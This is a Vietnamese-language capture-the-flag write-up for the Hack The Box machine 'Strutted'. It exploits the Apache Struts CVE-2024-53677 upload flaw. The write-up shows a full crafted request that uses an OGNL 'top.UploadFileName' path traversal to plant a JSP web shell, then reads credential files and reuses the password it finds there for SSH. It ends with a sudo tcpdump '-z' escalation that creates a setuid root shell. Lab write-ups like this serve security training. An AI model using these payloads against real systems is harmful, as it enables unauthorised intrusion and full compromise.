# Strutted

<img width="1393" height="659" alt="image" src="https://github.com/user-attachments/assets/61007768-c0f9-48fa-ba7a-0cc8b0f89440" />

Tôi dùng nmap để scan các port có trên địa chỉ ip được cung cấp:

```
❯ sudo nmap -sV -sS 10.10.11.59
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-14 15:42 +0700
Nmap scan report for strutted.htb (10.10.11.59)
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds
```
Đây là giao diện của trang web khi truy cập trên trình duyệt, đường dẫn là `http://strutted.htb/`:

<img width="1867" height="944" alt="image" src="https://github.com/user-attachments/assets/248d4de4-9925-499e-99c5-c00c1473f977" />

Tôi có fuzz qua các dir, endpoint, subdomain nhưng không ra cái gì đáng chú ý, khi sử dụng trang web thì có `http://strutted.htb/download.action` là tải về src code của web(file exploit.txt là tôi tự thêm vào nên không cần quan tâm, src code không có file đấy đâu):

<img width="1600" height="696" alt="image" src="https://github.com/user-attachments/assets/9313d642-b346-470a-bc15-e581e8524c3f" />

Để ý trong file `strutted/pom.xml` , biết được website sử dụng phiên bản `6.3.0.1`:

<img width="1266" height="586" alt="image" src="https://github.com/user-attachments/assets/04d1d35e-7bf1-4cbc-93c8-3572e19ae1a1" />

Có 1 cái [CVE-2024-53677](https://www.dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/?source=post_page-----31bd09097eb0---------------------------------------) dẫn đến RCE.

Cơ mà tôi clone mấy đoạn exploit trên github về nhưng không chạy được(hoặc do tôi không biết dùng) 

Nguyên nhân là do `FileUploadInterceptor`, các phiên bản bị chịu ảnh hưởng là từ 2.0.0 đến trước 6.4.0 (bao gồm các nhánh 2.0.x, 2.5.x, 6.0.0–6.3.0.2). Ứng dụng không dùng FileUploadInterceptor không bị ảnh hưởng

`FileUploadInterceptor` đưa ba giá trị vào map tham số cho mỗi trường file: <name> (nội dung file tạm), <name>ContentType, <name>FileName (tên file gốc)

Một điểm kỹ thuật quan trọng giúp tấn công thành công là từ khóa đặc biệt top trong OGNL (trỏ tới phần tử đầu của value stack – chính là Action hiện tại). 
Kẻ tấn công có thể lợi dụng điều này để ghi đè có chủ đích thuộc tính như fileFileName của Action, 
khiến ứng dụng sử dụng đường dẫn do kẻ tấn công cung cấp khi lưu file. Đây là khiếm khuyết mass‑assignment kết hợp với path traversal trong luồng upload, gây ra Path traversal → tải file vào vị trí tùy ý → có thể RCE

Đầu tiên thì tôi upload 1 cái ảnh và bắt request đó lại:

<img width="1555" height="828" alt="image" src="https://github.com/user-attachments/assets/603a7eba-a81d-49cb-87ba-ac6931f3476a" />

Sửa request thành thế này, đổi tên thành `Upload`, thêm `WebKitFormBoundarymRlI8gL9FTKrb4rw` và bên dưới đó là `Content-Disposition: form-data; name="top.UploadFileName"` và vị trí upload:

```
POST /upload.action HTTP/1.1
Host: strutted.htb
Content-Length: 419
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://strutted.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymRlI8gL9FTKrb4rw
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://strutted.htb/upload.action
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=3FE2C535C3C2BF948BF31BB24B894837
Connection: keep-alive

------WebKitFormBoundarymRlI8gL9FTKrb4rw
Content-Disposition: form-data; name="Upload"; filename="abcd.jpg"
Content-Type: image/jpeg

jpg signature
this is a test!
------WebKitFormBoundarymRlI8gL9FTKrb4rw
Content-Disposition: form-data; name="top.UploadFileName"

../../abc.jsp
------WebKitFormBoundarymRlI8gL9FTKrb4rw--
```
<img width="1206" height="577" alt="image" src="https://github.com/user-attachments/assets/db998dba-9dc9-4d14-836b-8d060a8fa2e1" />

Điểm chốt của request: phần field thường top.UploadFileName buộc Struts ghi đè giá trị tên file

Trường file tên Upload → theo tài liệu Struts, FileUploadInterceptor sẽ tự thêm 3 tham số tương ứng cho tên trường này:

upload (đối tượng File tạm),

uploadContentType (String),

uploadFileName (String – tên file phía client).

Lý do phải đổi thành `Upload` viết hoa chữ U là do đây:

<img width="1138" height="741" alt="image" src="https://github.com/user-attachments/assets/2d80cd10-d33b-4b17-a8a6-197e9480ca45" />

Tên tham số `top.UploadFileName` sẽ được `ParametersInterceptor` xem như một biểu thức `OGNL` và ghi giá trị vào thuộc tính tương ứng trên đối tượng ở “đỉnh” ValueStack (thường là Action). 
Struts ghi rõ: “parameter names are effectively OGNL statements” và kiểm soát (lọc) biểu thức trong `acceptableName`.

upload tệp bất kỳ rồi dùng tham số OGNL `top.UploadFileName` để đổi đường dẫn (ở đây là `../../`) và đuôi sang `.jsp` ở vị trí có thể thực thi

<img width="1535" height="631" alt="image" src="https://github.com/user-attachments/assets/9fc561df-655a-46ca-b490-da1559d8310e" />

<img width="666" height="224" alt="image" src="https://github.com/user-attachments/assets/8822ddd4-7d78-4ba8-bcc1-560795f46aa1" />

Tôi sử dụng [shell.jsp](https://raw.githubusercontent.com/TAM-K592/CVE-2024-53677-S2-067/refs/heads/ALOK/shell.jsp) để thực thi, lúc này request trở thành:

<img width="1518" height="792" alt="image" src="https://github.com/user-attachments/assets/b5ae0b15-4121-4d09-b28a-ce05080bf328" />

Upload lên và truy cập vào `/shell.jsp?action=cmd&cmd=id`, lúc này lệnh được thực thi:

<img width="1464" height="464" alt="image" src="https://github.com/user-attachments/assets/5d4fb6b7-9122-4c4d-b78b-2fd2ba18e8a9" />

Để ý thì có file `/etc/tomcat9/tomcat-users.xml` là chứa mật khẩu của admin 

<img width="1461" height="706" alt="image" src="https://github.com/user-attachments/assets/bf0f92b6-85e6-431f-87b7-b115014412d6" />

Mở file `/etc/passwd` thì có user là `james` có bash, tôi thử ssh vào user `james` bằng mật khẩu `IT14d6SSP81k` thì được

<img width="1482" height="707" alt="image" src="https://github.com/user-attachments/assets/f6f3b1d1-1c31-496b-b592-f0afb438761e" />

```
james@strutted:~$ cat user.txt 
dca6570953f15d0413d935726a38eda0
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

Khi chạy `sudo -l` thì có `tcpdump` là có thể được chạy dưới quyền root, tôi lợi dùng điều này sử dụng:

```
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF         
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ /tmp/bash -p
bash-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(james)
bash-5.1# cat /root/root.txt
419bc47eb36a40c7f3036e2fdc26ad23
```

Ở đây thì là gán `COMMAND` là giá trị `'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'`, sau đó tạo 1 file temp ở `/tmp`, truyền giá trị của `COMMAND` vào `TF` tức là file 
temp đó, thêm quyền thực thi vào file đó. Tiếp theo là lệnh `tcpdump` gồm:

- Bắt đầu lắng nghe trên giao diện loopback.

- Giả vờ ghi các gói tin vào một tệp nhưng thực chất là vứt bỏ chúng (/dev/null).

- Cứ sau mỗi 1 giây (-G 1), nó thực hiện một thao tác "xoay vòng tệp".

- Sau mỗi lần "xoay vòng tệp" đó, nó thực thi lệnh được lưu trong biến $TF (-z $TF), -Z là chạy file ở phần -z dưới quyền root mà `tcpdump` đang có.



